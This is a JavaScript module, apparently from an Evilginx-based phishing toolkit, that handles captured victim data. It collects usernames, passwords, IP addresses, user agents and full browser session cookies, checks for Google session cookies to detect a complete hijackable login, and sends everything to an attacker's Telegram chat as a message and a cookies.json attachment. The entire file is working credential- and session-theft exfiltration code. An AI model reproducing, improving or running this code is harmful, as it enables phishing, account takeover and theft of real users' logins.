import { writeFileSync, unlinkSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

let telegramCfg = {
  enabled: false,
  botToken: '',
  chatId: '',
};

/** sessionId -> { credsSent, cookieHash } — new messages only, never edit */
const sent = new Map();

export function setTelegramConfig(raw = {}) {
  const fromEnvToken = process.env.TELEGRAM_BOT_TOKEN || process.env.EVILHOOKED_TELEGRAM_TOKEN || '';
  const fromEnvChat = process.env.TELEGRAM_CHAT_ID || process.env.EVILHOOKED_TELEGRAM_CHAT_ID || '';
  const block = raw.telegram && typeof raw.telegram === 'object' ? raw.telegram : raw;
  telegramCfg = {
    enabled: block.enabled !== false && Boolean(block.botToken || block.bot_token || block.teletoken || fromEnvToken),
    botToken: String(block.botToken || block.bot_token || block.teletoken || fromEnvToken || '').trim(),
    chatId: String(block.chatId || block.chat_id || block.chatid || fromEnvChat || '').trim(),
  };
  return telegramCfg;
}

function telegramReady() {
  return telegramCfg.enabled && telegramCfg.botToken && telegramCfg.chatId;
}

function cookieRows(cookies) {
  if (!Array.isArray(cookies)) return [];
  return cookies.filter((c) => c && c.name && String(c.value ?? '') !== '');
}

function targetFrom(config, payload) {
  const host = String(payload.loginHost || config?.loginHost || payload.phishletName || 'google.com');
  if (/google/i.test(host) || host === 'google') return 'google.com';
  return host.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^www\./, '') || 'google.com';
}

function sessionSummary(config, payload) {
  return {
    Target: targetFrom(config, payload),
    ip: String(payload.clientIp || ''),
    user_agent: String(payload.userAgent || ''),
    username: String(payload.username || payload.email || ''),
    password: String(payload.password || ''),
  };
}

function captionJson(summary) {
  return JSON.stringify(summary, null, 4);
}

/** Full captured cookie objects — browser-export shape, filename always cookies.json */
function cookiesJsonBody(cookies) {
  const now = Math.floor(Date.now() / 1000) + 365 * 24 * 3600;
  return JSON.stringify(cookieRows(cookies).map((c) => ({
    name: c.name,
    value: c.value,
    domain: c.domain || '',
    path: c.path || '/',
    expires: typeof c.expires === 'number' ? c.expires : 0,
    expirationDate: c.expirationDate || (c.expires > 0 ? c.expires : now),
    httpOnly: Boolean(c.httpOnly),
    secure: Boolean(c.secure) || String(c.name).startsWith('__Host-') || String(c.name).startsWith('__Secure-'),
    sameSite: c.sameSite || '',
    hostOnly: typeof c.hostOnly === 'boolean' ? c.hostOnly : !(c.domain && String(c.domain).startsWith('.')),
    session: c.expires === -1 || c.expires === 0,
  })), null, 2);
}

function cookiesLookComplete(cookies) {
  const names = new Set(cookieRows(cookies).map((c) => String(c.name)));
  const keys = ['SID', 'SSID', 'HSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PSIDTS'];
  let n = 0;
  for (const k of keys) if (names.has(k)) n += 1;
  return n >= 2 || names.has('__Secure-1PSID') || names.has('SID');
}

function cookieHash(cookies) {
  return cookieRows(cookies).map((c) => `${c.name}=${c.value}@${c.domain}`).sort().join('|');
}

async function telegramPost(method, fields, fileBuf, filename, fileField) {
  const url = `https://api.telegram.org/bot${telegramCfg.botToken}/${method}`;
  const fd = new FormData();
  for (const [k, v] of Object.entries(fields)) fd.append(k, String(v));
  if (fileBuf && filename) {
    fd.append(fileField, new Blob([fileBuf], { type: 'application/json' }), filename);
  }
  const res = await fetch(url, { method: 'POST', body: fd });
  const json = await res.json().catch(() => ({}));
  if (!res.ok || json.ok === false) {
    throw new Error(json.description || `telegram ${method} ${res.status}`);
  }
  return json;
}

/**
 * Latest_Evilginx capture pipeline (not telegramfix):
 * - caption is JSON: Target / ip / user_agent / username / password
 * - attachment is always cookies.json with the full token dump
 * - new message each time cookies change; never edit; never email-named txt
 */
export async function notifyTelegramCapture(config, payload) {
  if (!telegramReady()) return { skipped: true };

  const summary = sessionSummary(config, payload);
  const cookies = payload.cookies || [];
  const hasCreds = Boolean(summary.username || summary.password);
  const hasCookies = cookieRows(cookies).length > 0;
  if (!hasCreds && !hasCookies) return { skipped: true };

  const sid = String(payload.sessionId || payload.clientIp || 'anon');
  const st = sent.get(sid) || { credsSent: false, cookieHash: '' };
  const caption = captionJson(summary);
  const complete = hasCookies && (payload.done || cookiesLookComplete(cookies));

  try {
    if (complete) {
      const hash = cookieHash(cookies);
      if (hash && hash === st.cookieHash) return { skipped: true, reason: 'same-cookies' };
      const body = cookiesJsonBody(cookies);
      const tmp = join(tmpdir(), `cookies-${sid.slice(0, 12)}.json`);
      writeFileSync(tmp, body, 'utf8');
      try {
        await telegramPost('sendDocument', {
          chat_id: telegramCfg.chatId,
          caption: caption.slice(0, 1024),
        }, body, 'cookies.json', 'document');
      } finally {
        try { unlinkSync(tmp); } catch { /* */ }
      }
      st.cookieHash = hash;
      st.credsSent = true;
      sent.set(sid, st);
      return { ok: true, attached: 'cookies.json' };
    }

    if (hasCreds && !st.credsSent) {
      await telegramPost('sendMessage', {
        chat_id: telegramCfg.chatId,
        text: caption,
      });
      st.credsSent = true;
      sent.set(sid, st);
      return { ok: true, attached: null };
    }

    return { skipped: true, reason: 'waiting-cookies' };
  } catch (err) {
    console.error('[telegram] notify failed:', err.message);
    return { ok: false, error: err.message };
  }
}

export function getTelegramConfig() {
  return { ...telegramCfg, botToken: telegramCfg.botToken ? '(set)' : '' };
}
